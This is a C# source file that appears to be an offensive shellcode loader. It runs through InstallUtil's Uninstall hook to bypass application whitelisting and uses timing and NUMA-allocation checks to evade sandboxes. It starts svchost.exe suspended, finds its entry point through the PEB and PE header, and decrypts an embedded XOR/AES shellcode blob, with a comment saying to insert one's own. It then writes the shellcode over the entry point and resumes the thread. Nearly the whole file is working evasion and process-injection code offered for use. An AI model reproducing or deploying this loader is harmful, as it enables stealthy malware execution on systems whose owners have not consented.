using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Configuration.Install;

namespace Bypass
{
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        // --- Win32 API Structures ---

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        // --- Win32 API Imports ---

        [DllImport("kernel32.dll")] static extern void Sleep(uint ms);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocExNuma(IntPtr hProc, IntPtr addr, uint size, uint type, uint prot, uint node);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string name, string cmd, IntPtr pa, IntPtr ta, bool inh, uint flags, IntPtr env, string dir, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("ntdll.dll")]
        private static extern int ZwQueryInformationProcess(IntPtr hProc, int cls, ref PROCESS_BASIC_INFORMATION bi, uint len, ref uint ret);
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, [Out] byte[] buf, int size, out IntPtr read);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buf, Int32 size, out IntPtr written);
        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        // --- Helper Methods ---

        private byte[] Xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }

        private byte[] AesDecrypt(byte[] cipher, byte[] key)
        {
            byte[] IV = new byte[16];
            Array.Copy(cipher, 0, IV, 0, 16);
            byte[] encryptedMessage = new byte[cipher.Length - 16];
            Array.Copy(cipher, 16, encryptedMessage, 0, cipher.Length - 16);

            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);
                    }
                    return ms.ToArray();
                }
            }
        }

        // --- Main Logic (InstallUtil Bypass) ---

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // 1. HEURISTIC EVASION: Sleep Check
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

            // 2. HEURISTIC EVASION: Numa Check
            IntPtr check = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (check == IntPtr.Zero) return;

            // 3. START SUSPENDED PROCESS
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // 0x4 = CREATE_SUSPENDED
            CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // 4. LOCATE IMAGE BASE via PEB
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            
            // ImageBaseAddress is at PEB + 0x10 on x64, +0x8 on x86
            int offset = (IntPtr.Size == 8) ? 0x10 : 0x8;
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + offset);
            
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            
            IntPtr svchostBase = (IntPtr.Size == 8) ? (IntPtr)BitConverter.ToInt64(addrBuf, 0) : (IntPtr)BitConverter.ToInt32(addrBuf, 0);

            // 5. PARSE PE HEADER FOR ENTRYPOINT
            byte[] data = new byte[0x200];
            ReadProcessMemory(pi.hProcess, svchostBase, data, data.Length, out nRead);
            
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)e_lfanew_offset + 0x28);
            IntPtr addressOfEntryPoint = (IntPtr)((UInt64)svchostBase + entrypoint_rva);

            // 6. DECRYPT PAYLOAD
            // Replace with your encrypted shellcode from create_XOR_shellcode.py
            byte[] encryptedShellcode = new byte[] { 0xcf, 0x8c, 0xbe, /* ... rest of bytes ... */ 0x5c, 0x13 };
            string key = "3drtghy";
            string cipherType = "xor";

            byte[] decrypted = null;
            if (cipherType == "xor")
                decrypted = Xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));
            else
                decrypted = AesDecrypt(encryptedShellcode, Convert.FromBase64String(key));

            // 7. INJECT & RESUME
            IntPtr written;
            WriteProcessMemory(pi.hProcess, addressOfEntryPoint, decrypted, decrypted.Length, out written);
            ResumeThread(pi.hThread);
        }
    }

    // Dummy Main for EXE compilation
    class Program { static void Main(string[] args) {} }
}
